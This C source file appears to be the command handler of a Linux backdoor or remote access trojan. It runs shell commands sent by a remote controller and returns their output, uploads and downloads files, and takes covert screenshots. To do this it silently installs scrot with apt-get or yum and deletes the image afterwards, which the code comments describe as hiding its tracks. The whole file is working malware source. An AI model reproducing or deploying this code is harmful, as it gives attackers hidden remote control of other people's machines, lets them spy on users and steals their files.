#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "cmd.h"
#include "debug.h"
#include "comms.h"

// Returns 0 if the client wants to close the connection and one otherwise.
// Frees the given command
char check_exit(char *cmd) {
    int ret = 1;
    if(strncmp(cmd, "quit", 5) == 0 ||
       strncmp(cmd, "q", 2) == 0 ||
       strncmp(cmd, "exit", 4) == 0 ||
       strncmp(cmd, "uninstall", 9) == 0) {
        ret = 0;
    }
    free(cmd);
    return ret;
}

// Executes the given command as if it were running on a shell.
// Sends the output of the shell command to the client.
void shell_cmd(char *cmd) {
    FILE *fp;
    char buf[1024] = {0};
    char hasOutput = 0;

    // Open the command for reading
    fp = popen(cmd, "r");
    if(fp == NULL) {
        debug_err("Error in popen()");
        exit(1);
    }

    // Read the output one line at a time and send it to the client
    while(fgets(buf, sizeof(buf), fp) != NULL) {
        hasOutput = 1;
        debug_print("%s", buf);
        send_output(buf);
        memset(buf, 0, sizeof(buf));
    }

    if(!hasOutput) {
        send_output("\n");
    }

    pclose(fp);
}

// Takes a screenshot
void screenshot() {
    // Cross your fingers and hope one of these works (or hope that scrot is already installed)
    system("apt-get -y install scrot >/dev/null 2>&1");
    system("yum -y install scrot >/dev/null 2>&1");

    // Take the screenshot and save it in /tmp/askdfj093ierw09ifb9.png
    // This will not work if scrot couldn't be installed.
    system("scrot /tmp/askdfj093ierw09ifb9.png >/dev/null 2>&1");

    // Check if the screenshot was created
    if(access("/tmp/askdfj093ierw09ifb9.png", F_OK) != -1) {
        // Allow the client to download the file and then delete the file to hide our tracks
        send_output("Screenshot taken and saved to out.png.\n");
        send_file("/tmp/askdfj093ierw09ifb9.png");
        remove("/tmp/askdfj093ierw09ifb9.png");
    } else {
        send_output("Screenshot could not be taken because scrot could not be installed.\n");
    }
}

// Takes a command sent from the client as input and processes it.
// Either this function or one of the functions that this function calls must always call
// send_output() at some point so that the client isn't left waiting for the output.
void process_cmd(char *cmd) {
    if(cmd[0] == '!') { // !<command> means run shell command
        shell_cmd(cmd+1);
    } else if(strncmp(cmd, "cd ", 3) == 0) { // Change the directory
        chdir(cmd + 3);
        shell_cmd("pwd");
    } else if(strncmp(cmd, "pwd", 4) == 0) { // Print the current directory
        shell_cmd("pwd");
    } else if(strncmp(cmd, "mkdir ", 6) == 0) { // Creates a directory
        shell_cmd(cmd);
    } else if(strncmp(cmd, "cat ", 4) == 0) { // Print out a file
        shell_cmd(cmd);
    } else if(strncmp(cmd, "ls", 3) == 0 || // List contents of directory
              strncmp(cmd, "ls ", 3) == 0 ||
              strncmp(cmd, "dir", 4) == 0 ||
              strncmp(cmd, "dir ", 4) == 0) {
        shell_cmd(cmd);
    } else if(strncmp(cmd, "rm ", 3) == 0) { // Delete a file
        shell_cmd(cmd);
    } else if(strncmp(cmd, "upload ", 7) == 0) { // Upload a client's file to the server
        strtok(cmd, " "); // Ignore the first token
        strtok(NULL, " "); // Ignore the second token (file name for client side)
        get_file(strtok(NULL, " "));
        send_output("\n");
    } else if(strncmp(cmd, "download ", 9) == 0) { // Sends a server's file to the client
        strtok(cmd, " "); // Ignore the first token
        send_file(strtok(NULL, " "));
        send_output("\n");
    } else if(strncmp(cmd, "screenshot", 10) == 0) { // Takes a screenshot
        screenshot();
        send_output("\n");
    } else {
        send_output("\n");
    }
}
